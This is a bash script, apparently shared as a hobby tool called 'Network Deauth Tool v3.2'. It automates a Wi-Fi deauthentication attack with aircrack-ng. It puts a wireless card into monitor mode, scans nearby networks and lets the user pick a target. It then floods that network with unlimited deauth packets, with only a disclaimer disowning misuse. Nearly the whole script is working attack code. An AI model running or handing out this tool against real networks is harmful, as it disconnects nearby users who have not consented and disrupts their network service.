#!/bin/bash
#install aircrack-ng
sudo apt-get install -y aircrack-ng 
sudo apt update -y 

#colors 
GREEN="\e[32m"
RED="\e[31m"
PURPLE="\e[35m"
CYAN="\e[36m"
YELLOW="\e[33m"
BLUE="\e[34m"
Reset="\e[97m"
BOLD="\e[1m"

clear 
echo -e "${RED}${BOLD}"
echo "  ██████╗ ███████╗ █████╗ ██╗   ██╗████████╗██╗  ██╗"
echo "  ██╔══██╗██╔════╝██╔══██╗██║   ██║╚══██╔══╝██║  ██║"
echo "  ██║  ██║█████╗  ███████║██║   ██║   ██║   ███████║"
echo "  ██║  ██║██╔══╝  ██╔══██║██║   ██║   ██║   ██╔══██║"
echo "  ██████╔╝███████╗██║  ██║╚██████╔╝   ██║   ██║  ██║"
echo "  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝"
echo -e "${YELLOW}${BOLD}"
echo "  ╔══════════════════════════════════════════════════╗"
echo "  ║            Network Deauth Tool v3.2              ║"
echo "  ╚══════════════════════════════════════════════════╝"
echo -e "${Reset}"
echo "Hi ,this script is an automation tool to perform a deauthentication attack"
echo "on a nearby Wi-Fi network using aircrack-ng. "
echo "The hole script depends on the aircrack-ng suite.
     <all credits goes to the Aircrack-ng dev team.>"
echo -e "${RED}${BOLD}⚠️  Disclaimer: ${Reset} I am not responsible for any misuse of this tool. "
echo -e "${Reset}                                                            by${BOLD}${GREEN} RAEF"

echo -e "${PURPLE}${BOLD}"
echo  "╔═══════════════════════════════════════════════════════╗"
echo  "║                  INITIALIZATION                       ║"
echo  "╚═══════════════════════════════════════════════════════╝"
echo -e "${GREEN}${BOLD}"
read -p "🚀 Press Enter to continue..."

if ! command -v airmon-ng &> /dev/null || ! command -v airodump-ng &> /dev/null || ! command -v aireplay-ng &> /dev/null; then
  echo -e "${RED} Required tools not found. Please install aircrack-ng properly.${Reset}"
  exit 1
fi

ifconfig
echo -e "${CYAN}${BOLD}"
read -p "🔧 Enter u're Net Card's name : " card
echo -e "${Reset}"

sudo airmon-ng start "$card" > /dev/null 2>&1
sudo airmon-ng check kill > /dev/null 2>&1


 echo -e "${PURPLE}${BOLD}"
 echo  "╔═══════════════════════════════════════════════════════╗"
 echo  "║                   TARGET SELECTION                    ║"
 echo  "╚═══════════════════════════════════════════════════════╝"



echo "📡 Scanning for networks..."
timestamp=$(date +%s)
output_prefix="scan_results_$timestamp"
echo -e "${GREEN}${BOLD}"
sudo timeout 15s airodump-ng --write "$output_prefix" --output-format csv "$card"

csv_file="${output_prefix}-01.csv"
while [ ! -f "$csv_file" ]; do sleep 1; done

mapfile -t networks < <(awk -F',' '
  NR > 1 && $1 ~ /([0-9A-F]{2}:){5}[0-9A-F]{2}/ && $14 != "" {
    gsub(/^ +| +$/, "", $1);
    gsub(/^ +| +$/, "", $4);
    gsub(/^ +| +$/, "", $14);
    print $1 "|" $4 "|" $14
  }' "$csv_file")

if [ ${#networks[@]} -eq 0 ]; then
  echo -e "${RED}${BOLD} No networks found. Try again or increase scan time.${Reset}"
  exit 1
fi
clear
echo -e "${PURPLE}${BOLD}"
 echo  "╔═══════════════════════════════════════════════════════╗"
 echo  "║                   Available Networks                  ║"
 echo  "╚═══════════════════════════════════════════════════════╝"

for i in "${!networks[@]}"; do
  IFS='|' read -r bssid channel essid <<< "${networks[$i]}"
  printf "   ${YELLOW}[%d]${Reset} ${BOLD}${GREEN}%-30s${Reset} ${BLUE}(CH: %s)\n" "$i" "$essid" "$channel"
done

echo -e "${Reset}"
read -p "🎯 Enter the number of the target network: " choice

if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -ge "${#networks[@]}" ]; then
  echo -e "${RED}${BOLD} Invalid selection.${Reset}"
  exit 1
fi

IFS='|' read -r bssid channel essid <<< "${networks[$choice]}"

echo -e "${PURPLE}${BOLD}⚡ Target Selected: $essid (${bssid}), Channel $channel${Reset}"
sudo iwconfig "$card" channel "$channel"

echo -e "${RED}${BOLD}💥 Starting the deauth attack on '$essid' ($bssid) ... Ctrl+C to stop.${Reset}"
echo -e "${GREEN}"
sudo aireplay-ng --deauth 0 -a "$bssid" "$card"
wait
echo -e "${CYAN}"
read -p "Press ENTER to exit ......"
sleep 1s 
echo -e "${RED}${BOLD} exiting ...."

echo -e "${Reset}"
read -p " Do you want to restore your Wi-Fi connection? (y/n): " restore

if [[ "$restore" =~ ^[Yy]$ ]]; then
  echo -e "${YELLOW}🛠 Stopping monitor mode and restarting network manager...${Reset}"
  sudo ip link set wlo1 down
  sleep 0.5s 
  sudo iwconfig $card  mode managed 
  sleep 0.5s
  sudo ip link set wlo1 up
  sleep 0.5s 
  sudo service NetworkManager restart
  sleep 1s 
  echo -e "${GREEN} Wi-Fi should be back now.${Reset}"
  echo -e "${RED}${BOLD}GB"
fi
#by raef
